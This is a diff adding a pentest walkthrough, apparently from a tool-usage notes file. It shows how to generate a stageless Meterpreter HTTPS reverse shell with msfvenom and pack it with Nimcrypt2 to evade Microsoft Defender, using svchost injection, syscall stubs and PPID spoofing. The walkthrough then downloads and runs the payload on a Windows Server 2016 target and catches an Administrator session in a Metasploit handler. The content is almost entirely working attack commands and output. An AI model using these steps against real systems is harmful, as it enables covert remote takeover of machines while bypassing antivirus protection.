@@ -270,4 +270,131 @@ C:\Temp_audit>NimRubeus.exe kerberoast
                              58D04CADDC40EDC52CA882DCE61F6F774287F69FE7EA29B13385C3E3E663AA1552A805BE51047877
                              4562FBB44A7F3AC73D3D95441790FCA4E833B85A35494FFBB63B58A992512FD67C58E7B776E4F7EF
                              <SNIP>
+                             
 
+==========================================================================================================================================
+Example 3 - Running a a stageless Meterpreter (x64) https reverse shell (packed by Nimcrypt2) without being detected by Defender AV
+=======================================================================================================================================
+
+
+STEP 1 - Generate a Meterpreter reverse shell HTTPS (x64 - stageless) using 'Msfvenom'
+---------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main$ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread 
+HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem LHOST=192.168.1.30 LPORT=443 -a x64 -f raw 
+-o meterpreter-x64-stageless-reverse-https-raw.bin
+
+
+STEP 2 - Use 'Nimcrypv2' to generate a packed version of the Meterpreter HTTPS reverse shell (x64)
+---------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main$ ./nimcrypt -f ./meterpreter-x64-stageless-reverse-https-raw.bin -t raw -e 
+-o NimRevShell4.exe -p svchost.exe
+                      ___                                           
+                   .-'   `'.                                        
+                  /         \                                       
+                  |         ;                                       
+                  |         |           ___.--,                     
+         _.._     |0) ~ (0) |    _.---'`__.-( (_.                   
+  __.--'`_.. '.__.\    '--. \_.-' ,.--'`     `""`                   
+ ( ,.--'`   ',__ /./;   ;, '.__.'`    __                            
+ _`) )  .---.__.' / |   |\   \__..--""  ""'--.,_                    
+`---' .'.''-._.-'`_./  /\ '.  \ _.-~~~````~~~-._`-.__.'             
+      | |  .' _.-' |  |  \  \  '.               `~---`              
+       \ \/ .'     \  \   '. '-._)                                  
+        \/ /        \  \    `=.__`~-.   Nimcrypt v2               
+   jgs  / /\         `) )    / / `"".`\                             
+  , _.-'.'\ \        / /    ( (     / /  3-in-1 C#, PE, & Raw Shellcode Loader
+   `--~`   ) )    .-'.'      '.'.  | (                              
+          (/`    ( (`          ) )  '-;                             
+           `      '-;         (-'                                   
+
+[+] Using svchost.exe for shellcode injection
+[+] GetSyscallStub enabled
+[+] String encryption enabled
+[+] Sandbox checks enabled
+[+] Unhooking ntdll.dll disabled
+[+] PPID spoofing enabled
+[+] Verbose messages disabled
+[+] Syscall name randomization enabled
+Hint: used config file '/home/jeff/.choosenim/toolchains/nim-1.6.8/config/nim.cfg' [Conf]
+Hint: used config file '/home/jeff/.choosenim/toolchains/nim-1.6.8/config/config.nims' [Conf]
+......................................................................................................................................................................................
+/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/GetSyscallStub.nim(6, 8) Hint: duplicate import of 'winim'; previous import here: /home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/stub.nim(5, 8) [DuplicateModuleImport]
+/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/GetSyscallStub.nim(7, 8) Hint: duplicate import of 'strutils'; previous import here: /home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/stub.nim(9, 8) [DuplicateModuleImport]
+/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/GetSyscallStub.nim(8, 8) Hint: duplicate import of 'ptr_math'; previous import here: /home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/stub.nim(10, 8) [DuplicateModuleImport]
+/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/GetSyscallStub.nim(12, 5) Hint: 'Value' should be: 'value' [Name]
+/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/GetSyscallStub.nim(13, 5) Hint: 'ValuePtr' should be: 'valuePtr' [Name]
+<SNIP>
+Hint: gc: refc; opt: size; options: -d:release
+1276946 lines; 14.689s; 347.035MiB peakmem; proj: /home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/stub.nim; out: /home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/NimRevShell4.exe [SuccessX]
+
+[+] Stub compiled successfully as NimRevShell4.exe
+
+
+STEP 3 - Download and execute the encrypted payload on a target Windows Server 2016 (with the MS Defender AV enabled & up-to-date)
+---------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+192.168.1.51 - - [31/Dec/2022 00:53:30] "GET / HTTP/1.1" 200 -
+192.168.1.51 - - [31/Dec/2022 00:53:38] "GET /NimRevShell4.exe HTTP/1.1" 200 -
+
+PS C:\Users\Administrator\Downloads> wget -URI http://192.168.1.30:8080/NimRevShell4.exe -OutFile NimRevShell4.exe
+
+PS C:\Users\Administrator\Downloads> NimRevShell4.exe
+
+
+STEP 4 - Enjoy the Meterpreter reverse shell running on the target Windows Server 2016 without being detected by the MS Defender AV
+------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.1.30; set LPORT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem;  run -j"
+[sudo] password for jeff: 
+
+       =[ metasploit v6.1.14-dev                          ]
++ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
++ -- --=[ 596 payloads - 46 encoders - 10 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: View a module's description using 
+info, or the enhanced version in your browser with 
+info -d
+
+[*] Starting persistent handler(s)...
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/x64/meterpreter_reverse_https
+LHOST => 192.168.1.30
+LPORT => 443
+EXITFUNC => thread
+ExitOnSession => false
+SessionCommunicationTimeout => 0
+EnableUnicodeEncoding => true
+HandlerSSLCert => /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started HTTPS reverse handler on https://192.168.1.30:443
+msf6 exploit(multi/handler) > [!] https://192.168.1.30:443 handling request from 192.168.1.51; (UUID: ckn6c1fm) Without a database connected that payload UUID tracking will not work!
+[*] https://192.168.1.30:443 handling request from 192.168.1.51; (UUID: ckn6c1fm) Redirecting stageless connection from /jrHfVIB6ujjTu9K5sBSpgQ5DmY1wBQ9g_LZyG92t3M1w2fq4TO with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
+[*] https://192.168.1.30:443 handling request from 192.168.1.51; (UUID: ckn6c1fm) Attaching orphaned/stageless session...
+[*] Meterpreter session 1 opened (192.168.1.30:443 -> 127.0.0.1 ) at 2022-12-31 00:54:34 +0100
+
+msf6 exploit(multi/handler) > sessions -i 
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                  Connection
+  --  ----  ----                     -----------                                  ----------
+  1         meterpreter x64/windows  ORACLESERVER1\Administrator @ ORACLESERVER1  192.168.1.30:443 -> 127.0.0.1  (192.168.1.51)
+
+msf6 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: ORACLESERVER1\Administrator
+
+meterpreter > background
+[*] Backgrounding session 1...
+
+<SNIP>
